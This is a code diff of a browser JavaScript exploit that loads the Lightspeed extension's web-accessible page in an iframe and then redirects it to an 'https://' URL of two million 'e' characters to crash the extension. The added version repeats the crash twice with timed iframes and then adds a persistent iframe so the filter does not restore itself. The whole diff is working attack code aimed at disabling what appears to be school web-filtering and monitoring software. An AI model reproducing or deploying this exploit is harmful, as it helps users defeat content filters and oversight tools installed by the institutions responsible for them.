@@ -143,18 +143,27 @@
     	    extFrame.src = extURL;
     	    document.body.appendChild(extFrame);
     
-	    setTimeout(function() { // Exploit function which creates an iframe pointing to lightspeed's web accessible url and then redirects it to a 2 million digit long URI
-    		let killURL = "https://" + "e".repeat(2000000);
-    		extFrame.src = killURL;
-    		setTimeout(function() {
-        	    document.body.removeChild(extFrame);
-        	    document.body.removeChild(overlay);
-        	    let persistFrame = document.createElement("iframe"); // Persist iframe so lighspeed wont restore itself when the switch is flipped
-        	    persistFrame.src = extURL;
-        	    document.body.appendChild(persistFrame);
-        	    createPopup();
-    		}, 1000);
-	    }, 1000);
+    	    setTimeout(function () {
+        	let killURL = "https://" + "e".repeat(2000000);
+        	extFrame.src = killURL;
+        	setTimeout(function () {
+            	    document.body.removeChild(extFrame);
+            	    let extFrame2 = document.createElement("iframe");
+            	    extFrame2.src = extURL;
+            	    document.body.appendChild(extFrame2);
+            	    setTimeout(function () {
+               	        extFrame2.src = killURL;
+                	setTimeout(function () {
+                    	    document.body.removeChild(extFrame2);
+                    	    document.body.removeChild(overlay);
+                    	    let persistFrame = document.createElement("iframe");
+                    	    persistFrame.src = extURL;
+                    	    document.body.appendChild(persistFrame);
+                    	    createPopup();
+                	}, 1000);
+            	    }, 250);
+        	}, 1000);
+    	    }, 250);
 	}
 
 	function createPopup() {
